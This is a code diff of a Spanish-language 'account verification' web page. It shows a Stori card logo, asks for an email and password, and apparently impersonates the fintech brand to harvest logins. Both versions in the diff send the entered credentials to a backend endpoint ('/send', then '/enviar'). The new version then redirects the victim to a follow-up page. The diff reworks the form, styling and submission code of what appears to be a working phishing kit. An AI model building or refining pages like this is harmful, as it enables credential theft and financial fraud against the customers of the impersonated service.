@@ -2,161 +2,112 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Inicio de Sesión</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificación de cuenta</title>
+  <link rel="stylesheet" href="style.css">
   <style>
     body {
-      margin: 0;
-      font-family: 'Open Sans', sans-serif;
-      background: #f3f6f9;
+      background-color: #f3f6fb;
+      font-family: Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      height: 100vh;
+      margin: 0;
     }
-
-    .screen {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    .container {
       background: #fff;
-      padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
-      width: 90%;
+      border-radius: 15px;
+      padding: 40px 30px;
+      width: 100%;
       max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
       text-align: center;
     }
-
     .logo {
-      width: 100px;
-      margin-bottom: 1rem;
+      margin-bottom: 30px;
     }
-
-    .input-group {
-      display: flex;
-      align-items: center;
-      background: #f0f2f5;
+    .logo img {
+      height: 50px;
+    }
+    h2 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #777;
+      font-size: 0.95em;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
       border-radius: 8px;
-      margin: 1rem 0;
-      padding: 0.5rem 1rem;
+      font-size: 1em;
+    }
+    button {
+      background-color: #00b075;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1em;
       width: 100%;
     }
-
-    .input-group .icon {
-      color: #888;
-      margin-right: 0.5rem;
-    }
-
-    .input-group input {
-      border: none;
-      background: transparent;
-      outline: none;
-      flex: 1;
-      font-size: 1rem;
-    }
-
-    button {
-      background: #00b67a;
-      color: white;
-      padding: 0.75rem 2rem;
-      border: none;
-      border-radius: 50px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 1rem;
-      transition: background 0.3s;
-    }
-
     button:hover {
-      background: #00a16a;
-    }
-
-    .mensaje-error {
-      color: red;
-      margin-top: 0.5rem;
-      font-size: 0.85rem;
-    }
-
-    .campo-requerido {
-      border: 1px solid red !important;
+      background-color: #019765;
     }
   </style>
 </head>
 <body>
-  <div class="screen">
-    <img src="https://i.imgur.com/GFGp9I7.png" alt="Stori Logo" class="logo">
+  <div class="container">
+    <div class="logo">
+      <!-- Puedes cambiar este ícono si quieres -->
+      <img src="https://stori.card/img/logo.svg" alt="logo" />
+    </div>
     <h2>Verificación de cuenta</h2>
     <p>Ingrese su correo y contraseña para continuar</p>
-
-    <!-- Correo -->
-    <div class="input-group">
-      <div class="icon"><i class="fas fa-envelope"></i></div>
-      <input type="email" id="email" placeholder="Correo electrónico" required>
-    </div>
-    <p id="emailError" class="mensaje-error"></p>
-
-    <!-- Contraseña -->
-    <div class="input-group">
-      <div class="icon"><i class="fas fa-lock"></i></div>
-      <input type="password" id="password" placeholder="Contraseña" required>
-    </div>
-    <p id="passwordError" class="mensaje-error"></p>
-
-    <button onclick="validarDatos()">Continuar</button>
+    <form id="loginForm">
+      <input type="email" id="email" name="email" placeholder="Correo electrónico" required />
+      <input type="password" id="password" name="password" placeholder="Contraseña" required />
+      <button type="submit">Continuar</button>
+    </form>
   </div>
 
   <script>
-    async function enviarADestino(email, password) {
-      const res = await fetch("/send", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          email,
-          password
-        })
-      });
-      const data = await res.json();
-      console.log("Respuesta:", data);
-    }
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
 
-    function validarDatos() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const emailError = document.getElementById("emailError");
-      const passwordError = document.getElementById("passwordError");
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-      let valido = true;
-      emailError.textContent = "";
-      passwordError.textContent = "";
+      const data = {
+        usuario: email,
+        contrasena: password
+      };
 
-      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+      try {
+        const response = await fetch('/enviar', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
 
-      if (!email) {
-        emailError.textContent = "Correo obligatorio";
-        valido = false;
-      } else if (!emailRegex.test(email)) {
-        emailError.textContent = "Correo inválido";
-        valido = false;
+        if (response.ok) {
+          window.location.href = '/opciones.html';
+        } else {
+          alert('Error al enviar los datos');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Hubo un error');
       }
-
-      if (!password) {
-        passwordError.textContent = "Contraseña obligatoria";
-        valido = false;
-      } else if (password.length < 4) {
-        passwordError.textContent = "Mínimo 4 caracteres";
-        valido = false;
-      }
-
-      if (valido) {
-        enviarADestino(email, password);
-        alert("Datos enviados correctamente");
-      }
-    }
+    });
   </script>
 </body>
 </html>
